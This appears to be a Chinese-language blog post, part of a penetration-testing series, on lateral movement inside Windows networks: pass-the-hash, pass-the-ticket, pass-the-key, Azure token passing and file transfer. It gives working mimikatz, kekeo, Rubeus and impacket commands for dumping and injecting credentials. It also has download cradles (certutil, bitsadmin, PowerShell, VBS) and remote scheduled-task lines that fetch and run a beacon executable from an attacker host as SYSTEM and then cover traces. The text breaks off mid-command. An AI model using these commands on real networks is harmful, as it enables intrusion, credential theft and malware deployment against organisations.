---
title: 内网渗透(十)：横向移动
url: https://mp.weixin.qq.com/s/dABrYX7nH4VEBdibuAp4ng
source: Doonsec's feed
date: 2026-02-07
fetch_date: 2026-02-08T04:27:47.156196
---

# 内网渗透(十)：横向移动

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2v7clEl5e0iaWGMyAgGA86j1wLknlq8JpfYoHicY4wHJibajCmibIhabMl0msDrFgxZLxWIkOJfRltFdca5Xbv78hFAYww4vKvG94tBUjjEp4f4/0?wx_fmt=jpeg)

# 内网渗透(十)：横向移动

JJ1ng
JJ1ng

JJ1ng

![]()

在小说阅读器中沉浸阅读

# 0x00 简介

本章节主要介绍横向移动相关的内容。个人才疏学浅，有未阐述清楚或遗漏的地方，可自行搜索相关资料参考学习。

主要内容：工作组与域环境下的各类横向移动手法，包括：PTH、PTT、PTK、PTA、Pass the PRT、IPC、PsExec、RDP、WMI、WinRM、DCOM 等，以及 GOAD 靶场演示。

---

**横向移动**（Lateral Movement）是指以被攻陷的主机为跳板，通过各种手段控制其他内网主机的过程，且通过层层递进最终拿下域控的权限。总的来说，只要是能接管内网中其他主机的手段都可以归为横向移动，比如：漏洞利用（永恒之蓝、Web 漏洞、组件漏洞等）、服务利用、水坑攻击、传递攻击等。

## 1. Windows 共享

默认共享是为了方便管理员远程管理而开启的共享，包括：所有逻辑盘（如：`C$,D$,E$...`）和系统目录`WINNT`或`WINDOWS(ADMIN$)`，可通过建立 `IPC$` 连接来访问这些默认共享。

参考链接：

https://www.cnblogs.com/eagletian/articles/79024.html

https://cloud.tencent.com/developer/article/1937086

https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/

通过 `net share` 命令来查看系统当前共享的文件夹。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/2v7clEl5e0hf10ZDTYMjz6MeqoV3LBe8XgTfMxlQKRt0a8Fjh7g9Q15Zw8EtwKmvewkkNWSjqTHeibZS0GhM3g6icLibfP78g1tlYvxLvLv7Uo/640?wx_fmt=png&from=appmsg)

### 1.1 IPC

IPC（Inter-Process Communication，进程间通信），在 Windows 中是一个特殊的数据通道（也可叫做命名管道），是进程间通信的桥梁，只有建立 `IPC` 连接才能进行下一步动作。而 `IPC$` 是 Windows 为了让其他主机访问本机命名管道而暴露出来的一个共享端点，通过 `IPC$` 共享端点建立 `IPC` 命名管道的会话后，再使用该管道执行各种操作，例如：操作文件、管理服务、查看进程、执行命令等。

容易混淆的点：默认共享和 `IPC$` 共享。所有的远程操作都需建立在 `IPC$` 共享之上，默认共享是指实际的共享文件夹，只有建立 `IPC$` 连接且权限满足的情况下，才能访问共享文件夹。

想通过 `IPC$` 进行横向，需要满足如下条件：

* 开放 139、445 端口，在高版本的系统中只需要 445 端口
* 开启默认共享

### 1.2 空连接

在进行 IPC 连接时，需提供可信的用户名和密码，在双方建立安全的连接通道后，才能实现对远程计算机的访问。而空连接即代表不需要账号密码就能建立 `IPC` 连接，在早期的操作系统中（Windows 2008 之前）较为常见且权限较高；但之后微软加强了安全策略，导致空连接的权限非常低，基本什么都做不了。有关空连接、匿名连接、来宾会话的区别，可参考：https://blog.whiteflag.io/blog/guest-vs-null-session-on-windows/

## 2. 传递攻击

凭证信息可以是多种形式，如：密码、Hash（`LM Hash`、`NTLM Hash`、`Net-NTLM Hash`）、票据、令牌、私钥、证书等。而传递攻击就是指通过某种方式将这些凭证信息传递到远程主机，以此来通过认证实现接管远程目标。常见的几种传递攻击有：PTH、PTT、PTK 等，另一种新型的、基于云环境的传递攻击包括：PTA、Pass the PRT 等。

### 2.1 哈希传递（PTH）

哈希传递（Pass the Hash，简称 PTH），是内网横向移动的一种常用的方式，是一种通过密码哈希来进行移动的技术。在**《内网渗透(二)：认证协议》**篇章中可以知道，无论是工作组还是域环境，在认证过程中都是使用密码 Hash 来完成整个流程，所以即便无法破解密码得到明文，也是能直接使用该 Hash 来完成认证流程，与明文密码等效。

参考链接：

https://en.hackndo.com/pass-the-hash/

https://juggernaut-sec.com/pass-the-hash-attacks/

https://www.thehacker.recipes/ad/movement/ntlm/pth

面对内部成百上千主机，系统维护人员可不会一台台手动配置，往往都是通过自动化的方式来完成环境的初始化部署。而这就意味着自动化部署主机的本地管理员账户往往都是相同的，所以，只要能拿到任意一台主机本地 Administrator 账户密码的 Hash，通过**哈希碰撞**（密码喷洒的另一种形式）探测出相同密码的主机，即可使用 PTH 完成横向移动。

由于本地账户受 UAC 的影响，不同的系统版本受到的限制有所不同。具体如下：

* 工作组

+ Windows Vista 之前的机器，可以使用本地管理员组内的所有用户进行 PTH
+ Windows Vista 之后的机器，只能使用 Administrator 账号来进行 PTH

* 域环境

+ 针对域主机，可使用该域主机本地管理员组中的普通域用户进行 PTH
+ 针对域控，可使用域管理组内的所有用户进行 PTH

### 2.2 票据传递（PTT）

在《内网渗透(二)：认证协议》一篇中已有介绍，域环境中使用 Kerberos 协议进行认证，而该协议主要涉及 TGT 和 ST 两个票据。票据传递（Pass the Ticket，简称 PTT），将用于认证的票据注入到当前主机内存中，并以此来访问其他主机。由于涉及 Kerberos 协议，所以只适用于域环境。注：对于黄金票据、白银票据、钻石票据、蓝宝石票据等内容，会在后续《权限维持》篇章进行详细的介绍。

参考链接：https://zhuanlan.zhihu.com/p/475689947

```
# 清空内存中的票据
klist purge
kekeo "kerberos::purge"
mimikatz "kerberos::purge"

# 生成票据，这里的 USER 及 HASH 是需要能访问远程主机权限的用户
kekeo "tgt::ask /user:USER /domain:DOMAIN /ntlm:NTLM"

# 生成票据
impacket-getTGT DOMAIN/USER:PASS
impacket-getTGT DOMAIN/USER -hashes LM:NTLM
impacket-getTGT DOMAIN/USER -aesKey 'KEY'

# 生成票据
Rubeus asktgt /user:USER /aes128 KEY /ptt
Rubeus asktgt /user:USER /aes256:KEY /opsec /ptt

# 导出内存中的已有的票据
mimikatz "privilege::debug""sekurlsa::tickets /export"exit

# 注入票据
kekeo "kerberos::ptt TICKET"exit

# 注入票据
mimikatz "kerberos::ptt TICKET"exit
```

### 2.3 密钥传递（PTK）

密钥传递（Pass the Key，简称 PTK），原理是通过获取用户的 AES 密钥，并以此来进行认证，实现横向移动。该方式适用在禁用 NTLM 认证的域环境下使用。注：PTH、PTT、PTK 的区别仅在于名称和认证的媒介不同，原理都大差不差。

参考链接：https://swisskyrepo.github.io/InternalAllTheThings/active-directory/hash-pass-the-key/

```
# 导出 AES Key
mimikatz "log" "privilege::debug" "sekurlsa::ekeys" exit

# 工具 Mimikatz
mimikatz "sekurlsa::pth" "/user:USER" "/domain:DOMAIN" "/aes256:KEY" exit
```

### 2.4 证书传递（PTA）

证书传递（Pass the AzureAD Certificate，简称 PTA），是一种通过 AzureAD 证书来进行横向移动的方式，适用于 AzureAD 云环境。

参考链接：

https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597

https://whoamianony.top/posts/entra-id-attack-surface-of-pass-through-authentication/

https://cloud.hacktricks.wiki/zh/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/az-pass-the-certificate.html

### 2.5 Pass the PRT

Pass the PRT（Pass the primary refresh token），是一种通过 PRT 令牌来进行横向移动的方式。

参考链接：

https://netwrix.com/en/resources/blog/pass-the-prt-overview/

https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/

## 3. 工具推荐

https://github.com/The-Viper-One/PsMapExec

https://github.com/byt3bl33d3r/CrackMapExec

https://github.com/Pennyw0rth/NetExec

https://github.com/login-securite/lsassy

https://github.com/gentilkiwi/mimikatz

https://github.com/gentilkiwi/kekeo

https://github.com/fortra/impacket

https://github.com/ShawnDEvans/smbmap

https://github.com/Kevin-Robertson/Invoke-TheHash

https://github.com/0xthirteen/MoveKit

https://github.com/maaaaz/impacket-examples-windows

# 0x01 横向移动

---

横向移动是一种行为，可以有多种方式来实现横向移动，常见的有：IPC、SMB、WMI、RDP 等，大部分横向行为都是基于用户凭证信息来开展的。

命令查询网站：

https://wadcoms.github.io/

https://lolbas-project.github.io/

参考链接：

https://xz.aliyun.com/news/13497

https://tttang.com/archive/1890/

https://forum.butian.net/share/3680

https://cangqingzhe.github.io/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/

![](https://mmbiz.qpic.cn/mmbiz_png/2v7clEl5e0hoTXbVasBxQicWAmcZia9b58fibibJQamGKHeZia0Wiar0gNhKD7eIgcTnCoDYQR6yKQFJur8mYylhQZYictgUwS5q2xpE2SXuDmgLfA/640?wx_fmt=png&from=appmsg)
> 图片来源：https://tttang.com/archive/1890/

## 1. 文件传输

### 1.1 Windows 自带工具

```
# Curl
curl -o C:\Beacon.exe http://IP:PORT/Beacon.exe

# Certutil
certutil -urlcache -split -f http://IP:PORT/Beacon.exe C:\Beacon.exe

# Certreq
certreq -Post -config http://IP:PORT/Beacon.exe c:\windows\win.ini C:\Beacon.exe

# BitsAdmin
bitsadmin /transfer test http://IP:PORT/Beacon.exe C:\Beacon.exe

# PowerShell
powershell -nop -exec bypass -Command "(New-Object Net.WebClient).DownloadFile('http://IP:PORT/Beacon.exe', 'C:\Beacon.exe')"
powershell -command "Start-BitsTransfer -Source http://IP:PORT/Beacon.exe -Destination C:\Beacon.exe"
```

### 1.2 搭建 SMB 服务器

可以通过 `impacket` 套件中的 `smbserver.py` 脚本来快速搭建 SMB 服务。脚本地址：

https://github.com/fortra/impacket/blob/master/impacket/smbserver.py

https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer

```
mkdir /tmp/smbshare && impacket-smbserver MySMBServer /tmp/smbshare -smb2support
```

### 1.3 网络共享

```
# 建立 IPC 连接
net use \\IP\IPC$ "PASS" /user:"USER"

# 拷贝文件至远程主机
copy Beacon.exe \\IP\C$
```

### 1.4 VBS 脚本

```
# 创建 vbs 脚本
echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> downfile.vbs

 # 使用 vbs 脚本来实现远程文件下载
cscript downfile.vbs http://IP:PORT/cs.exe c:\windows\temp\cs.exe
```

## 2. IPC

成功建议 IPC 连接后，可以通过创建计划任务、服务等方式来进行横向移动。

### 2.1 AT

AT 在小于 Windows 2012 的系统中可用来创建计划任务。

```
# 查看远程主机时间
net time \\IP

# 通过 AT 工具来实现
copy Beacon.exe \\IP\c$
at \\IP 18:00:00 C:\Beacon.exe
at \\IP 1 /delete

# 工具 impacket
impacket-atexec -hashes LM:NTLM DOMAIN/USER@IP whoami
```

### 2.2 Schtasks

schtasks 在 Windows 2012 及以上的系统中可用来创建计划任务。

```
# 通过 PowerShell 下载
schtasks /create /s IP /u USER /p PASS /tn TASK_NAME /tr "powershell -WindowStyle Hidden -nop -exec bypass -Command \"(New-Object Net.WebClient).DownloadFile('http://IP:PORT/Beacon.exe', 'C:\Beacon.exe'); Start-Process 'C:\Beacon.exe'; Start-Sleep -s 5; schtasks /delete /tn TASK_NAME /f\"" /sc ONCE /st 18:00 /rl HIGHEST /f /ru "SYSTEM"

# 通过 Certutil 下载
schtasks /create /s IP /u USER /p PASS /tn TASK_NAME /tr "cmd /c certutil -urlcache -split -f http://IP:PORT/Beacon.exe C:\Beacon.exe && start /b C:\Beacon.exe && timeout /t 5 && del C:\Beacon.exe && schtasks ...